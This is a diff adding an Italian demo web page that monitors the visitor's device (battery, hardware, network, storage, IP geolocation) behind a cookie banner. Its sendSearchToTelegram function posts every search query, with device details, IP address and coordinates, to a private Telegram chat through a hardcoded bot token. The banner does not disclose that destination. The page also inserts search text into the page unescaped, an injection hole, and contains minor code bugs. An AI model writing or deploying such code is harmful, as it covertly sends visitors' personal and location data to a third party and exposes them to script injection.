@@ -1,0 +1,1016 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sito con Monitoraggio Batteria</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f5f5f5;
+        }
+
+        header {
+            background: linear-gradient(135deg, #4285f4, #34a853);
+            color: white;
+            padding: 1.5rem;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .search-container {
+            display: flex;
+            justify-content: center;
+            margin: 2rem 0;
+            gap: 0.5rem;
+        }
+
+        #search-input {
+            padding: 0.8rem;
+            width: 400px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: border-color 0.3s;
+        }
+
+        #search-input:focus {
+            border-color: #4285f4;
+            outline: none;
+        }
+
+        #search-btn {
+            padding: 0.8rem 1.5rem;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 1rem;
+            transition: background 0.3s;
+        }
+
+        #search-btn:hover {
+            background: #3367d6;
+        }
+
+        #search-results {
+            background: white;
+            margin: 0 auto;
+            width: 90%;
+            padding: 1.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+        }
+
+        /* Sezione Informazioni Dispositivo */
+        .device-info {
+            background: white;
+            margin: 2rem auto;
+            padding: 1.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .info-card {
+            background: #f9f9f9;
+            padding: 1rem;
+            border-radius: 8px;
+            border-left: 4px solid #4285f4;
+        }
+
+        .info-card h3 {
+            margin-top: 0;
+            color: #4285f4;
+        }
+
+        /* Stile Batteria */
+        .battery-container {
+            display: flex;
+            align-items: center;
+            margin: 1rem 0;
+        }
+
+        .battery {
+            width: 120px;
+            height: 60px;
+            border: 3px solid #333;
+            border-radius: 8px;
+            position: relative;
+            margin-right: 1rem;
+            background: #f1f1f1;
+        }
+
+        .battery::after {
+            content: '';
+            position: absolute;
+            right: -10px;
+            top: 20px;
+            width: 6px;
+            height: 20px;
+            background: #333;
+            border-radius: 0 3px 3px 0;
+        }
+
+        .battery-level {
+            height: 100%;
+            background: linear-gradient(to right, #4CAF50, #8BC34A);
+            border-radius: 5px;
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .battery-info {
+            flex-grow: 1;
+        }
+
+        .battery-percentage {
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        .battery-status {
+            display: flex;
+            align-items: center;
+            margin-top: 0.5rem;
+        }
+
+        .charging-icon {
+            margin-right: 0.5rem;
+            color: #FFC107;
+            font-size: 1.2rem;
+        }
+
+        /* Cookie Banner */
+        .cookie-banner {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #2d3748;
+            color: white;
+            padding: 1.5rem;
+            box-shadow: 0 -2px 15px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+        }
+
+        .cookie-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .cookie-text {
+            flex: 1;
+            margin-right: 1rem;
+            margin-bottom: 1rem;
+        }
+
+        .cookie-buttons {
+            display: flex;
+            gap: 0.8rem;
+            flex-wrap: wrap;
+        }
+
+        .cookie-btn {
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+        }
+
+        .accept {
+            background: #4CAF50;
+            color: white;
+        }
+
+        .accept:hover {
+            background: #3e8e41;
+        }
+
+        .reject {
+            background: #f44336;
+            color: white;
+        }
+
+        .reject:hover {
+            background: #d32f2f;
+        }
+
+        .customize {
+            background: #FFC107;
+            color: #333;
+        }
+
+        .customize:hover {
+            background: #FFA000;
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1001;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.5);
+            backdrop-filter: blur(5px);
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: 10% auto;
+            padding: 2rem;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 600px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+            animation: modalFadeIn 0.3s;
+        }
+
+        @keyframes modalFadeIn {
+            from {opacity: 0; transform: translateY(-20px);}
+            to {opacity: 1; transform: translateY(0);}
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-header h2 {
+            margin: 0;
+            color: #4285f4;
+        }
+
+        .close {
+            color: #aaa;
+            font-size: 28px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+
+        .close:hover {
+            color: #333;
+        }
+
+        .cookie-option {
+            margin: 1.2rem 0;
+            display: flex;
+            align-items: center;
+        }
+
+        .cookie-option input {
+            margin-right: 1rem;
+            transform: scale(1.2);
+        }
+
+        .save-btn {
+            padding: 0.8rem 1.5rem;
+            background: #4285f4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1rem;
+            transition: background 0.3s;
+            margin-top: 1rem;
+            width: 100%;
+        }
+
+        .save-btn:hover {
+            background: #3367d6;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .search-container {
+                flex-direction: column;
+                align-items: center;
+            }
+            
+            #search-input {
+                width: 100%;
+            }
+            
+            .cookie-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .cookie-buttons {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Monitoraggio Dispositivo Avanzato</h1>
+        <p>Esempio di sito con rilevamento batteria e informazioni dispositivo</p>
+    </header>
+
+    <div class="container">
+        <div class="search-container">
+            <input type="text" id="search-input" placeholder="Cerca qualcosa...">
+            <button id="search-btn">Cerca</button>
+        </div>
+        
+        <div id="search-results"></div>
+
+        <div id="device-info" class="device-info" style="display: none;">
+            <h2>Informazioni Dettagliate Dispositivo</h2>
+            <div class="info-grid">
+                <div class="info-card">
+                    <h3>Stato Batteria</h3>
+                    <div class="battery-container">
+                        <div class="battery">
+                            <div class="battery-level" id="battery-level"></div>
+                        </div>
+                        <div class="battery-info">
+                            <div class="battery-percentage" id="battery-percentage">0%</div>
+                            <div class="battery-status">
+                                <span class="charging-icon" id="charging-icon" style="display: none;">⚡</span>
+                                <span id="battery-status-text">Stato: Sconosciuto</span>
+                            </div>
+                        </div>
+                    </div>
+                    <p id="battery-details">Tempo rimanente: Calcolo in corso...</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Informazioni Hardware</h3>
+                    <p id="hardware-info">Caricamento...</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Connessione di Rete</h3>
+                    <p id="connection-info">Caricamento...</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Storage Locale</h3>
+                    <p id="storage-info">Caricamento...</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Posizione Stimata</h3>
+                    <p id="location-info">Caricamento...</p>
+                </div>
+
+                <div class="info-card">
+                    <h3>Browser e Sistema</h3>
+                    <p id="browser-info">Caricamento...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Cookie Banner -->
+    <div id="cookie-banner" class="cookie-banner">
+        <div class="cookie-content">
+            <div class="cookie-text">
+                <p>Utilizziamo cookie e tecnologie simili per migliorare la tua esperienza, salvare le tue ricerche e raccogliere informazioni sul dispositivo. Accetti i nostri cookie?</p>
+            </div>
+            <div class="cookie-buttons">
+                <button id="accept-cookies" class="cookie-btn accept">Accetta tutti</button>
+                <button id="reject-cookies" class="cookie-btn reject">Rifiuta</button>
+                <button id="customize-cookies" class="cookie-btn customize">Personalizza</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Cookie Settings Modal -->
+    <div id="cookie-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Preferenze Cookie</h2>
+                <span class="close">&times;</span>
+            </div>
+            <p>Seleziona quali cookie e funzionalità di tracciamento vuoi abilitare:</p>
+            
+            <div class="cookie-option">
+                <input type="checkbox" id="essential-cookies" checked disabled>
+                <label for="essential-cookies">Cookie essenziali (necessari per il funzionamento del sito)</label>
+            </div>
+            <div class="cookie-option">
+                <input type="checkbox" id="search-cookies">
+                <label for="search-cookies">Salva cronologia ricerche</label>
+            </div>
+            <div class="cookie-option">
+                <input type="checkbox" id="analytics-cookies">
+                <label for="analytics-cookies">Cookie analitici (ci aiutano a migliorare il sito)</label>
+            </div>
+            <div class="cookie-option">
+                <input type="checkbox" id="device-cookies">
+                <label for="device-cookies">Monitoraggio dispositivo (batteria, hardware, connessione)</label>
+            </div>
+            <div class="cookie-option">
+                <input type="checkbox" id="location-cookies">
+                <label for="location-cookies">Stima posizione approssimativa (basata su IP)</label>
+            </div>
+            
+            <button id="save-preferences" class="save-btn">Salva preferenze</button>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Elementi del DOM
+            const cookieBanner = document.getElementById('cookie-banner');
+            const acceptCookiesBtn = document.getElementById('accept-cookies');
+            const rejectCookiesBtn = document.getElementById('reject-cookies');
+            const customizeCookiesBtn = document.getElementById('customize-cookies');
+            const cookieModal = document.getElementById('cookie-modal');
+            const closeModal = document.querySelector('.close');
+            const savePreferencesBtn = document.getElementById('save-preferences');
+            const searchInput = document.getElementById('search-input');
+            const searchBtn = document.getElementById('search-btn');
+            const searchResults = document.getElementById('search-results');
+            const deviceInfoSection = document.getElementById('device-info');
+            
+            // Elementi batteria
+            const batteryLevel = document.getElementById('battery-level');
+            const batteryPercentage = document.getElementById('battery-percentage');
+            const chargingIcon = document.getElementById('charging-icon');
+            const batteryStatusText = document.getElementById('battery-status-text');
+            const batteryDetails = document.getElementById('battery-details');
+            
+            // Variabili per le preferenze cookie
+            let cookiesAccepted = false;
+            let saveSearchHistory = false;
+            let collectAnalytics = false;
+            let collectDeviceInfo = false;
+            let collectLocation = false;
+            
+            // Dati dispositivo
+            let deviceData = {
+                battery: {},
+                connection: {},
+                hardware: {},
+                location: {},
+                storage: {},
+                browser: {}
+            };
+            
+            // Controlla se ci sono preferenze cookie salvate
+            const savedCookiePrefs = localStorage.getItem('cookiePreferences');
+            if (savedCookiePrefs) {
+                const prefs = JSON.parse(savedCookiePrefs);
+                cookiesAccepted = prefs.accepted;
+                saveSearchHistory = prefs.saveSearchHistory;
+                collectAnalytics = prefs.collectAnalytics;
+                collectDeviceInfo = prefs.collectDeviceInfo;
+                collectLocation = prefs.collectLocation;
+                
+                if (cookiesAccepted) {
+                    loadSearchHistory();
+                    if (collectDeviceInfo) {
+                        initDeviceDataCollection();
+                    }
+                }
+            } else {
+                // Mostra il banner solo se non ci sono preferenze salvate
+                setTimeout(() => {
+                    cookieBanner.style.display = 'block';
+                }, 1000);
+            }
+            
+            // Gestione click sui pulsanti del cookie banner
+            acceptCookiesBtn.addEventListener('click', () => {
+                cookiesAccepted = true;
+                saveSearchHistory = true;
+                collectAnalytics = true;
+                collectDeviceInfo = true;
+                collectLocation = true;
+                saveCookiePreferences();
+                cookieBanner.style.display = 'none';
+                loadSearchHistory();
+                initDeviceDataCollection();
+            });
+            
+            rejectCookiesBtn.addEventListener('click', () => {
+                cookiesAccepted = false;
+                saveSearchHistory = false;
+                collectAnalytics = false;
+                collectDeviceInfo = false;
+                collectLocation = false;
+                saveCookiePreferences();
+                cookieBanner.style.display = 'none';
+                clearSearchHistory();
+                deviceInfoSection.style.display = 'none';
+            });
+            
+            customizeCookiesBtn.addEventListener('click', () => {
+                // Imposta lo stato delle checkbox in base alle preferenze correnti
+                document.getElementById('search-cookies').checked = saveSearchHistory;
+                document.getElementById('analytics-cookies').checked = collectAnalytics;
+                document.getElementById('device-cookies').checked = collectDeviceInfo;
+                document.getElementById('location-cookies').checked = collectLocation;
+                cookieModal.style.display = 'block';
+            });
+            
+            // Chiudi il modal
+            closeModal.addEventListener('click', () => {
+                cookieModal.style.display = 'none';
+            });
+            
+            // Chiudi il modal cliccando fuori
+            window.addEventListener('click', (event) => {
+                if (event.target === cookieModal) {
+                    cookieModal.style.display = 'none';
+                }
+            });
+            
+            // Salva le preferenze personalizzate
+            savePreferencesBtn.addEventListener('click', () => {
+                cookiesAccepted = true; // Accetta almeno i cookie essenziali
+                saveSearchHistory = document.getElementById('search-cookies').checked;
+                collectAnalytics = document.getElementById('analytics-cookies').checked;
+                collectDeviceInfo = document.getElementById('device-cookies').checked;
+                collectLocation = document.getElementById('location-cookies').checked;
+                
+                saveCookiePreferences();
+                cookieModal.style.display = 'none';
+                cookieBanner.style.display = 'none';
+                
+                if (saveSearchHistory) {
+                    loadSearchHistory();
+                } else {
+                    clearSearchHistory();
+                }
+                
+                if (collectDeviceInfo) {
+                    initDeviceDataCollection();
+                } else {
+                    deviceInfoSection.style.display = 'none';
+                }
+            });
+            
+            // Funzione per salvare le preferenze cookie
+            function saveCookiePreferences() {
+                const prefs = {
+                    accepted: cookiesAccepted,
+                    saveSearchHistory: saveSearchHistory,
+                    collectAnalytics: collectAnalytics,
+                    collectDeviceInfo: collectDeviceInfo,
+                    collectLocation: collectLocation
+                };
+                localStorage.setItem('cookiePreferences', JSON.stringify(prefs));
+            }
+            
+            // Gestione della ricerca
+            searchBtn.addEventListener('click', performSearch);
+            searchInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    performSearch();
+                }
+            });
+            
+            function performSearch() {
+                const query = searchInput.value.trim();
+                if (query === '') return;
+                
+                // Mostra i risultati (simulato)
+                searchResults.innerHTML = `<p>Risultati per: <strong>${query}</strong></p>`;
+                
+                // Salva la ricerca se consentito
+                if (cookiesAccepted && saveSearchHistory) {
+                    saveSearchQuery(query);
+                    
+                    // Prepara i dati da inviare
+                    const searchData = {
+                        query: query,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        deviceData: collectDeviceInfo ? deviceData : null,
+                        location: collectLocation ? deviceData.location : null
+                    };
+                    
+                    sendSearchToTelegram(searchData);
+                }
+            }
+            
+            // Salva la query di ricerca
+            function saveSearchQuery(query) {
+                let searches = JSON.parse(localStorage.getItem('searchHistory') || '[]');
+                searches.unshift(query); // Aggiungi all'inizio
+                searches = searches.slice(0, 10); // Mantieni solo le ultime 10 ricerche
+                localStorage.setItem('searchHistory', JSON.stringify(searches));
+            }
+            
+            // Carica la cronologia delle ricerche
+            function loadSearchHistory() {
+                const searches = JSON.parse(localStorage.getItem('searchHistory') || []);
+                if (searches.length > 0) {
+                    searchResults.innerHTML = '<h3>Le tue ultime ricerche:</h3><ul>' + 
+                        searches.map(search => `<li>${search}</li>`).join('') + '</ul>';
+                }
+            }
+            
+            // Cancella la cronologia delle ricerche
+            function clearSearchHistory() {
+                localStorage.removeItem('searchHistory');
+                searchResults.innerHTML = '';
+            }
+            
+            // Inizializza la raccolta dati dispositivo
+            function initDeviceDataCollection() {
+                if (!collectDeviceInfo) return;
+                
+                deviceInfoSection.style.display = 'block';
+                
+                // Raccogli informazioni hardware
+                collectHardwareInfo();
+                
+                // Raccogli informazioni sulla connessione
+                collectConnectionInfo();
+                
+                // Raccogli informazioni sulla batteria (se supportato)
+                if ('getBattery' in navigator) {
+                    navigator.getBattery().then(battery => {
+                        updateBatteryInfo(battery);
+                        
+                        // Aggiungi event listener per i cambiamenti
+                        battery.addEventListener('levelchange', () => updateBatteryInfo(battery));
+                        battery.addEventListener('chargingchange', () => updateBatteryInfo(battery));
+                        battery.addEventListener('chargingtimechange', () => updateBatteryInfo(battery));
+                        battery.addEventListener('dischargingtimechange', () => updateBatteryInfo(battery));
+                    });
+                } else {
+                    document.getElementById('battery-info').innerHTML = 
+                        '<p>Informazioni batteria non disponibili su questo dispositivo.</p>';
+                }
+                
+                // Stima posizione approssimativa (basata su IP)
+                if (collectLocation) {
+                    estimateLocation();
+                }
+                
+                // Mostra le informazioni raccolte
+                displayDeviceInfo();
+            }
+            
+            // Raccogli informazioni hardware
+            function collectHardwareInfo() {
+                deviceData.hardware = {
+                    platform: navigator.platform,
+                    cores: navigator.hardwareConcurrency || 'Sconosciuto',
+                    deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Sconosciuto',
+                    maxTouchPoints: navigator.maxTouchPoints || 0,
+                    screen: {
+                        width: screen.width,
+                        height: screen.height,
+                        colorDepth: `${screen.colorDepth} bit`,
+                        pixelDepth: `${screen.pixelDepth} bit`,
+                        orientation: screen.orientation ? screen.orientation.type : 'Sconosciuto'
+                    },
+                    windowSize: {
+                        width: window.innerWidth,
+                        height: window.innerHeight
+                    }
+                };
+                
+                // Aggiorna l'UI
+                document.getElementById('hardware-info').innerHTML = `
+                    <strong>Piattaforma:</strong> ${deviceData.hardware.platform}<br>
+                    <strong>Core CPU:</strong> ${deviceData.hardware.cores}<br>
+                    <strong>Memoria:</strong> ${deviceData.hardware.deviceMemory}<br>
+                    <strong>Schermo:</strong> ${deviceData.hardware.screen.width}x${deviceData.hardware.screen.height}px<br>
+                    <strong>Profondità colore:</strong> ${deviceData.hardware.screen.colorDepth}
+                `;
+            }
+            
+            // Raccogli informazioni sulla connessione
+            function collectConnectionInfo() {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                
+                if (connection) {
+                    deviceData.connection = {
+                        type: connection.type || 'Sconosciuto',
+                        effectiveType: connection.effectiveType || 'Sconosciuto',
+                        downlink: connection.downlink ? `${connection.downlink} Mbps` : 'Sconosciuto',
+                        rtt: connection.rtt ? `${connection.rtt} ms` : 'Sconosciuto',
+                        saveData: connection.saveData ? 'Attivo' : 'Disattivo'
+                    };
+                    
+                    document.getElementById('connection-info').innerHTML = `
+                        <strong>Tipo:</strong> ${deviceData.connection.effectiveType}<br>
+                        <strong>Velocità download:</strong> ${deviceData.connection.downlink}<br>
+                        <strong>Latenza:</strong> ${deviceData.connection.rtt}<br>
+                        <strong>Risparmio dati:</strong> ${deviceData.connection.saveData}
+                    `;
+                } else {
+                    deviceData.connection = {
+                        type: 'Sconosciuto',
+                        online: navigator.onLine ? 'Online' : 'Offline'
+                    };
+                    
+                    document.getElementById('connection-info').innerHTML = `
+                        <strong>Stato connessione:</strong> ${deviceData.connection.online}
+                    `;
+                }
+            }
+            
+            // Aggiorna le informazioni sulla batteria
+            function updateBatteryInfo(battery) {
+                const percentage = Math.round(battery.level * 100);
+                
+                deviceData.battery = {
+                    level: battery.level,
+                    percentage: percentage,
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Aggiorna la UI
+                batteryLevel.style.width = `${percentage}%`;
+                batteryPercentage.textContent = `${percentage}%`;
+                
+                if (battery.charging) {
+                    chargingIcon.style.display = 'inline';
+                    batteryStatusText.textContent = 'In carica';
+                    
+                    // Cambia colore batteria durante la carica
+                    batteryLevel.style.background = 'linear-gradient(to right, #FFC107, #FF9800)';
+                    
+                    if (battery.chargingTime === Infinity) {
+                        batteryDetails.textContent = 'Tempo alla carica completa: Sconosciuto';
+                    } else {
+                        batteryDetails.textContent = `Tempo alla carica completa: ${formatTime(battery.chargingTime)}`;
+                    }
+                } else {
+                    chargingIcon.style.display = 'none';
+                    batteryStatusText.textContent = 'Scarica';
+                    
+                    // Ripristina colore normale
+                    batteryLevel.style.background = 'linear-gradient(to right, #4CAF50, #8BC34A)';
+                    
+                    if (battery.dischargingTime === Infinity) {
+                        batteryDetails.textContent = 'Tempo rimanente: Sconosciuto';
+                    } else {
+                        batteryDetails.textContent = `Tempo rimanente: ${formatTime(battery.dischargingTime)}`;
+                    }
+                }
+                
+                // Cambia colore in base alla percentuale
+                if (percentage < 20) {
+                    batteryLevel.style.background = 'linear-gradient(to right, #F44336, #E91E63)';
+                } else if (percentage < 50) {
+                    batteryLevel.style.background = 'linear-gradient(to right, #FF9800, #FF5722)';
+                }
+            }
+            
+            // Stima posizione approssimativa
+            function estimateLocation() {
+                // Usa un servizio esterno per ottenere la posizione approssimativa basata su IP
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        deviceData.location = {
+                            ip: data.ip,
+                            city: data.city,
+                            region: data.region,
+                            country: data.country_name,
+                            countryCode: data.country_code,
+                            postal: data.postal,
+                            latitude: data.latitude,
+                            longitude: data.longitude,
+                            timezone: data.timezone,
+                            org: data.org
+                        };
+                        
+                        document.getElementById('location-info').innerHTML = `
+                            <strong>Città:</strong> ${deviceData.location.city}<br>
+                            <strong>Regione:</strong> ${deviceData.location.region}<br>
+                            <strong>Paese:</strong> ${deviceData.location.country}<br>
+                            <strong>IP:</strong> ${deviceData.location.ip}<br>
+                            <strong>Provider:</strong> ${deviceData.location.org}
+                        `;
+                    })
+                    .catch(error => {
+                        console.error('Errore nel recupero della posizione:', error);
+                        deviceData.location = {
+                            error: 'Impossibile determinare la posizione'
+                        };
+                        
+                        document.getElementById('location-info').textContent = 'Posizione: non disponibile';
+                    });
+            }
+            
+            // Raccogli informazioni sullo storage
+            function collectStorageInfo() {
+                if ('storage' in navigator && 'estimate' in navigator.storage) {
+                    navigator.storage.estimate().then(estimate => {
+                        const used = formatBytes(estimate.usage);
+                        const quota = formatBytes(estimate.quota);
+                        const percentage = Math.round((estimate.usage / estimate.quota) * 100);
+                        
+                        deviceData.storage = {
+                            usage: estimate.usage,
+                            quota: estimate.quota,
+                            percentage: percentage
+                        };
+                        
+                        document.getElementById('storage-info').innerHTML = `
+                            <strong>Spazio usato:</strong> ${used}<br>
+                            <strong>Spazio totale:</strong> ${quota}<br>
+                            <strong>Percentuale usata:</strong> ${percentage}%
+                        `;
+                    });
+                } else {
+                    document.getElementById('storage-info').textContent = 'Informazioni storage non disponibili';
+                }
+            }
+            
+            // Raccogli informazioni sul browser
+            function collectBrowserInfo() {
+                deviceData.browser = {
+                    name: getBrowserName(),
+                    version: getBrowserVersion(),
+                    online: navigator.onLine ? 'Online' : 'Offline',
+                    cookiesEnabled: navigator.cookieEnabled ? 'Abilitati' : 'Disabilitati',
+                    language: navigator.language,
+                    languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+                    doNotTrack: navigator.doNotTrack || 'Non specificato'
+                };
+                
+                document.getElementById('browser-info').innerHTML = `
+                    <strong>Browser:</strong> ${deviceData.browser.name} ${deviceData.browser.version}<br>
+                    <strong>Lingua:</strong> ${deviceData.browser.language}<br>
+                    <strong>Stato connessione:</strong> ${deviceData.browser.online}<br>
+                    <strong>Cookie:</strong> ${deviceData.browser.cookiesEnabled}<br>
+                    <strong>Do Not Track:</strong> ${deviceData.browser.doNotTrack}
+                `;
+            }
+            
+            // Mostra tutte le informazioni del dispositivo
+            function displayDeviceInfo() {
+                collectHardwareInfo();
+                collectConnectionInfo();
+                collectStorageInfo();
+                collectBrowserInfo();
+            }
+            
+            // Invia i dati a Telegram
+            async function sendSearchToTelegram(data) {
+                const botToken = '7605005911:AAFGRr4k25QbRLOlxcT-6lb3riLB5iWlCjI';
+                const chatId = '5709299213';
+                
+                // Formatta il messaggio
+                let message = `🔍 <b>Nuova Ricerca</b>\n`;
+                message += `• <b>Query:</b> ${data.query}\n`;
+                message += `• <b>Data/Ora:</b> ${new Date(data.timestamp).toLocaleString('it-IT')}\n`;
+                message += `• <b>Browser:</b> ${data.userAgent}\n`;
+                
+                if (data.deviceData) {
+                    message += `\n📱 <b>Informazioni Dispositivo</b>\n`;
+                    message += `• <b>Sistema:</b> ${data.deviceData.hardware.platform}\n`;
+                    message += `• <b>Schermo:</b> ${data.deviceData.hardware.screen.width}x${data.deviceData.hardware.screen.height}px\n`;
+                    message += `• <b>Core CPU:</b> ${data.deviceData.hardware.cores}\n`;
+                    message += `• <b>Memoria:</b> ${data.deviceData.hardware.deviceMemory}\n`;
+                    
+                    if (data.deviceData.battery.level !== undefined) {
+                        message += `\n🔋 <b>Batteria</b>\n`;
+                        message += `• <b>Livello:</b> ${data.deviceData.battery.percentage}%\n`;
+                        message += `• <b>Stato:</b> ${data.deviceData.battery.charging ? 'In carica' : 'Scarica'}\n`;
+                        
+                        if (data.deviceData.battery.charging && data.deviceData.battery.chargingTime !== Infinity) {
+                            message += `• <b>Tempo alla carica completa:</b> ${formatTime(data.deviceData.battery.chargingTime)}\n`;
+                        } else if (!data.deviceData.battery.charging && data.deviceData.battery.dischargingTime !== Infinity) {
+                            message += `• <b>Tempo rimanente:</b> ${formatTime(data.deviceData.battery.dischargingTime)}\n`;
+                        }
+                    }
+                    
+                    if (data.deviceData.connection.effectiveType) {
+                        message += `\n🌐 <b>Connessione</b>\n`;
+                        message += `• <b>Tipo:</b> ${data.deviceData.connection.effectiveType}\n`;
+                        message += `• <b>Velocità:</b> ${data.deviceData.connection.downlink}\n`;
+                        message += `• <b>Latenza:</b> ${data.deviceData.connection.rtt}\n`;
+                    }
+                }
+                
+                if (data.location && data.location.city) {
+                    message += `\n📍 <b>Posizione Stimata</b>\n`;
+                    message += `• <b>Città:</b> ${data.location.city}, ${data.location.country}\n`;
+                    message += `• <b>Coordinate:</b> ${data.location.latitude}, ${data.location.longitude}\n`;
+                    message += `• <b>IP:</b> ${data.location.ip}\n`;
+                    message += `• <b>Provider:</b> ${data.location.org}\n`;
+                }
+                
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const responseData = await response.json();
+                    console.log('Messaggio inviato a Telegram:', responseData);
+                } catch (error) {
+                    console.error('Errore nell\'invio a Telegram:', error);
+                }
+            }
+            
+            // Funzioni di utilità
+            function formatTime(seconds) {
+                if (seconds === Infinity) return 'Sconosciuto';
+                const hours = Math.floor(seconds / 3600);
+                const minutes = Math.floor((seconds % 3600) / 60);
+                return `${hours > 0 ? hours + 'h ' : ''}${minutes}m`;
+            }
+            
+            function formatBytes(bytes) {
+                if (bytes === 0) return '0 Bytes';
+                const k = 1024;
+                const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
+                const i = Math.floor(Math.log(bytes) / Math.log(k));
+                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+            }
+            
+            function getBrowserName() {
+                const userAgent = navigator.userAgent;
+                if (userAgent.indexOf("Firefox") > -1) return "Firefox";
+                if (userAgent.indexOf("SamsungBrowser") > -1) return "Samsung Browser";
+                if (userAgent.indexOf("Opera") > -1 || userAgent.indexOf("OPR") > -1) return "Opera";
+                if (userAgent.indexOf("Trident") > -1) return "Internet Explorer";
+                if (userAgent.indexOf("Edge") > -1) return "Edge";
+                if (userAgent.indexOf("Chrome") > -1) return "Chrome";
+                if (userAgent.indexOf("Safari") > -1) return "Safari";
+                return "Sconosciuto";
+            }
+            
+            function getBrowserVersion() {
+                const userAgent = navigator.userAgent;
+                let temp;
+                let version = "Sconosciuto";
+                
+                if (userAgent.indexOf("Firefox") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("Firefox") + 8);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("SamsungBrowser") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("SamsungBrowser") + 14);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("Opera") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("Opera") + 6);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("OPR") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("OPR") + 4);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("Trident") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("rv:") + 3);
+                    version = temp.split(")")[0];
+                } else if (userAgent.indexOf("Edge") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("Edge") + 5);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("Chrome") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("Chrome") + 7);
+                    version = temp.split(" ")[0];
+                } else if (userAgent.indexOf("Safari") > -1) {
+                    temp = userAgent.substring(userAgent.indexOf("Version") + 8);
+                    version = temp.split(" ")[0];
+                }
+                
+                return version;
+            }
+        });
+    </script>
+</body>
+</html>
